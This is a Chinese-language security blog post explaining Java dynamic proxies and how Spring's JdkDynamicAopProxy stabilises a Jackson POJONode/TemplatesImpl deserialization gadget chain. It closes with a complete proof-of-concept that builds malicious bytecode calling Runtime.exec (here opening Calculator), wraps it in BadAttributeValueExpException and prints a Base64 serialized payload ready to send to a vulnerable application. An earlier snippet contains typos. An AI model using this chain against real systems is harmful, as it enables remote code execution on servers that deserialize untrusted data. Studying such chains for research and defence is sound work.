# JDK动态代理-AOP

  
  
&lt;!--more--&gt;  
## 0x00 前言  
在Java中动态代理是很强大的，被代理对象所能调用的方法取决于我们所给的接口，其功能取决于我们所给的`handler`。  
## 0x01 原理分析  
JDK动态代理需要了解两个类  
- `InvocationHandler`调用处理程序类和`Proxy`代理类  

`InvocationHandler`调用处理程序  
`public interface InvocationHandler`  
`InvocationHandler`是由代理实例的调用处理程序实现的接口  
每个代理实例都有一个关联的调用处理程序。  
`Object invoke(Object proxy,Method Method,Object[] args)`  
当在代理实例上调用方法的时候。会分派到其调用处理程序的`invoke()`方法  
`Proxy`代理类  
`public class Proxy extends Object implements Serializable`  
`Proxy`提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。  
动态代理类，是一个实现在类创建时在运行时指定的接口列表的类，具有如下所述的行为。 代理接口是由代理类实现的接口。 代理实例是代理类的一个实例。  
```  
public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException  
```  
demo  
```java  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Method;  
import java.lang.reflect.Proxy;  
  
public class JDKProxy {  
    public static void main(String[] args) {  
        Object myProxy = Proxy.newProxyInstance(MyProxy.class.getClassLoader(), new Class[]{MyInterface1.class,MyInterface2.class}, new MyHandler());  
        for(Method m:myProxy.getClass().getDeclaredMethods()){  
            System.out.println(m.getName());  
        }  
    }  
}  
  
interface MyInterface1 {  
    public void sayYes();  
}  
  
interface MyInterface2 {  
    public void sayNo();  
}  
  
class MyProxy{  
    public void eat(){  
        System.out.println(&#34;eat&#34;);  
    }  
    public void say() {  
        System.out.println(&#34;say something&#34;);  
    }  
    public String getName(String a) {  
        return a;  
    }  
}  
class MyHandler implements InvocationHandler {  
    @Override  
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {  
        System.out.println(&#34;invoke dynamic proxy handler&#34;);  
        return null;  
    }  
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504060118523.png)
其反射获得到的方法完全是根据接口来的，不管被代理的类是否实现了对应的方法。动态代理中方法的实现都方法在了`handler`中的`invoke`方法中了，调用其任意方法都会在`invoke`方法中执行，所以看所给的接口和`handler`就可以了。  
而`javax.xml.transform.Templaes`接口其只有`newTransformer`和`getOutputProperties`这两个方法，让其作为我们代理所需要的接口，这样最终通过`getDeclaredMethods`获取到的方法就只有`newTransformer`和`getOutputProperties`了，最终获得的`getter`方法便只有`getOutputProperties`了。  
所以我们需要找一个`handler`，他的`invoke`方法中能执行我们所调用的方法即可。  
在`JdkDynamicAopProxy`是`Spring`框架中的一个类，它实现了JDK动态代理机制，用于创建代理对象来实现面向切面编程(AOP)的功能。  
`org.springframework.aop.framework.JdkDynamicAopProxy`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504060130546.png)
重点看`invoke()`函数  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504060131860.png)
这里会执行所调用的`method`，`target`获取到的对象是由`advised`属性得到的，我们所需要的`TemplatesImpl`的对象用`org.springframework.aop.framework.AdvisedSupport`封装。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504060133565.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504060133143.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504060134674.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504060135608.png)
构造`templatesImpl`封装一下  
```java  
Class&lt;?&gt; clazz = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;);    
Constructor&lt;?&gt; constructor = clazz.getConstructor(AdvisedSupport.class);    
constructor.setAccessible(true);    
AdvisedSupport advisedSupport = new AdvisedSupport();    
advisedSupport.setTargetClass(templatesImpl);    
InvocatioHandler handler = (InvokeHandler) constructor.newInstance(advisedSupport);    
Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);    
POJONode jsonNodes = new POJONode(proxyObj);  
```  
## 稳定Payload  
```java  
import com.fasterxml.jackson.databind.node.POJONode;    
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import javassist.*;    
import org.springframework.aop.framework.AdvisedSupport;    
import javax.management.BadAttributeValueExpException;    
import javax.xml.transform.Templates;    
import java.io.*;    
import java.lang.reflect.*;    
import java.util.Base64;    
    
public class Poc {    
    public static void main(String[] args) throws Exception {    
        ClassPool pool = ClassPool.getDefault();    
        CtClass ctClass0 = pool.get(&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;);    
        CtMethod writeReplace = ctClass0.getDeclaredMethod(&#34;writeReplace&#34;);    
        ctClass0.removeMethod(writeReplace);    
        ctClass0.toClass();    
    
        CtClass ctClass = pool.makeClass(&#34;a&#34;);    
        CtClass superClass = pool.get(AbstractTranslet.class.getName());    
        ctClass.setSuperclass(superClass);    
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);    
        constructor.setBody(&#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;);    
        ctClass.addConstructor(constructor);    
        byte[] bytes = ctClass.toBytecode();    
    
        Templates templatesImpl = new TemplatesImpl();    
        setFieldValue(templatesImpl, &#34;_bytecodes&#34;, new byte[][]{bytes});    
        setFieldValue(templatesImpl, &#34;_name&#34;, &#34;test&#34;);    
        setFieldValue(templatesImpl, &#34;_tfactory&#34;, null);    
        //利用 JdkDynamicAopProxy 进行封装使其稳定触发    
        Class&lt;?&gt; clazz = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;);    
        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);    
        cons.setAccessible(true);    
        AdvisedSupport advisedSupport = new AdvisedSupport();    
        advisedSupport.setTarget(templatesImpl);    
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);    
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);    
        POJONode jsonNodes = new POJONode(proxyObj);    
    
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);    
        Field val = Class.forName(&#34;javax.management.BadAttributeValueExpException&#34;).getDeclaredField(&#34;val&#34;);    
        val.setAccessible(true);    
        val.set(exp,jsonNodes);    
    
        ByteArrayOutputStream barr = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);    
        objectOutputStream.writeObject(exp);    
        objectOutputStream.close();    
        String res = Base64.getEncoder().encodeToString(barr.toByteArray());    
        System.out.println(res);    
    
    }    
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{    
        Field f = obj.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(obj, arg);    
    }    
}  
```  

---

> Author: N1Rvana  
> URL: http://localhost:1313/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-aop/  

